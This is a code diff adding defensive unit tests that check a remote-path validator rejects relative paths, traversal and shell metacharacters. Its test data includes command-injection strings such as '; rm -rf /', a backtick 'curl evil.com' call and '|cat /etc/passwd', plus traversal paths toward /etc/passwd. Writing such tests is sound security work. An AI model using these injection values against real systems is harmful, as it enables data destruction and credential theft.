@@ -38,6 +38,7 @@ describe('E2B File Sync - Exports', () => {
 
   it('should export helper functions', () => {
     expect(typeof FileSync.validatePath).toBe('function');
+    expect(typeof FileSync.validateRemotePath).toBe('function');
     expect(typeof FileSync.buildExclusionList).toBe('function');
     expect(typeof FileSync.countFilesInTarball).toBe('function');
     expect(typeof FileSync.parseGitStatus).toBe('function');
@@ -45,6 +46,120 @@ describe('E2B File Sync - Exports', () => {
     expect(typeof FileSync.shouldSkipDirectory).toBe('function');
     expect(typeof FileSync.isTextFile).toBe('function');
     expect(typeof FileSync.formatBytes).toBe('function');
+  });
+});
+
+describe('E2B File Sync - validateRemotePath', () => {
+  it('should accept valid absolute paths', () => {
+    const validPaths = [
+      '/workspace',
+      '/tmp/data',
+      '/home/user/project',
+      '/var/www/app',
+      '/opt/app-v1.0',
+      '/data/files_2024',
+      '/workspace/.config',
+      '/usr/local/bin'
+    ];
+
+    for (const path of validPaths) {
+      expect(() => FileSync.validateRemotePath(path)).not.toThrow();
+    }
+  });
+
+  it('should reject empty or non-string paths', () => {
+    expect(() => FileSync.validateRemotePath('')).toThrow(/non-empty string/);
+    expect(() => FileSync.validateRemotePath(null as any)).toThrow(/non-empty string/);
+    expect(() => FileSync.validateRemotePath(undefined as any)).toThrow(/non-empty string/);
+    expect(() => FileSync.validateRemotePath(123 as any)).toThrow(/non-empty string/);
+  });
+
+  it('should reject relative paths', () => {
+    const relativePaths = [
+      'workspace',
+      './workspace',
+      '../workspace',
+      'tmp/data'
+    ];
+
+    for (const path of relativePaths) {
+      expect(() => FileSync.validateRemotePath(path)).toThrow(/must be absolute/);
+    }
+  });
+
+  it('should reject paths with shell metacharacters', () => {
+    const maliciousPaths = [
+      '/tmp/test; rm -rf /',
+      '/tmp/test$(whoami)',
+      '/tmp/test`curl evil.com`',
+      '/tmp/test && echo hacked',
+      '/tmp/test|cat /etc/passwd',
+      '/tmp/test>output.txt',
+      '/tmp/test<input.txt',
+      '/tmp/test&background',
+      '/tmp/test*wildcard',
+      '/tmp/test?question',
+      '/tmp/test~tilde',
+      '/tmp/test!bang',
+      '/tmp/test\\backslash',
+      '/tmp/test"quote',
+      "/tmp/test'quote",
+      '/tmp/test{brace}',
+      '/tmp/test[bracket]',
+      '/tmp/test(paren)',
+      '/tmp/test with spaces'
+    ];
+
+    for (const path of maliciousPaths) {
+      expect(() => FileSync.validateRemotePath(path)).toThrow(/unsafe characters/);
+    }
+  });
+
+  it('should reject directory traversal patterns', () => {
+    const traversalPaths = [
+      '/tmp/../etc/passwd',
+      '/workspace/../../root',
+      '/tmp/test..hacker',
+      '/workspace/../..',
+      '/tmp/..'
+    ];
+
+    for (const path of traversalPaths) {
+      expect(() => FileSync.validateRemotePath(path)).toThrow(/directory traversal/);
+    }
+  });
+
+  it('should reject paths with consecutive slashes', () => {
+    const badPaths = [
+      '/tmp//data',
+      '//workspace',
+      '/tmp///data'
+    ];
+
+    for (const path of badPaths) {
+      expect(() => FileSync.validateRemotePath(path)).toThrow(/consecutive slashes/);
+    }
+  });
+
+  it('should reject paths with invalid directory components', () => {
+    const badPaths = [
+      '/tmp/./data',
+      '/workspace/./file'
+    ];
+
+    for (const path of badPaths) {
+      expect(() => FileSync.validateRemotePath(path)).toThrow(/invalid directory component/);
+    }
+
+    // Note: '/tmp/../data' is caught by directory traversal check first
+    expect(() => FileSync.validateRemotePath('/tmp/../data')).toThrow(/directory traversal/);
+  });
+
+  it('should provide clear error messages', () => {
+    expect(() => FileSync.validateRemotePath('workspace')).toThrow(/must be absolute/);
+    expect(() => FileSync.validateRemotePath('/tmp/test; rm -rf /')).toThrow(/unsafe characters/);
+    expect(() => FileSync.validateRemotePath('/tmp/../etc')).toThrow(/directory traversal/);
+    expect(() => FileSync.validateRemotePath('/tmp//data')).toThrow(/consecutive slashes/);
   });
 });
 
